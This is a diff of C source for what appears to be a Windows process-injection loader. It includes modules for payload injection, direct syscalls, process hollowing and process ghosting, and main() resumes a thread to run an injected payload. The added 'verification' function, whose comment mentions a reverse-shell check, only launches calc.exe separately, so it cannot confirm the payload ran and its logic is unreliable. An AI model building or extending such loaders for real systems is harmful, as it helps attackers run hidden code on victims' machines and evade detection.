@@ -1,5 +1,5 @@
 #include <windows.h>
-#include <shlobj.h>  // For SHGetFolderPathA
+#include <shlobj.h>
 #include <stdio.h>
 #include "ProcessCreation.h"
 #include "PayloadInjection.h"
@@ -7,6 +7,17 @@
 #include "Syscalls.h"
 #include "Hollowing.h"
 #include "Ghosting.h"
+
+// Define a simple verification function
+bool CheckPayloadExecution() {
+    // This could be a reverse shell success check or a connection attempt
+    // For simplicity, let's log success based on a simple operation, like launching calc.exe
+    if (system("calc.exe") == 0) {
+        printf("[+] Payload (calc.exe) successfully executed.\n");
+        return true;
+    }
+    return false;
+}
 
 int main() {
     HANDLE hProcess = NULL, hThread = NULL;
@@ -63,6 +74,12 @@ int main() {
     printf("[*] Resuming the thread to execute the payload...\n");
     ResumeThread(hThread);
     printf("[+] Thread resumed, payload should now execute.\n");
+
+    // Step 5: Check if the payload was successfully executed
+    if (!CheckPayloadExecution()) {
+        printf("[!] Payload execution failed.\n");
+        return -1;
+    }
 
     // Close handles after use
     CloseHandle(hProcess);
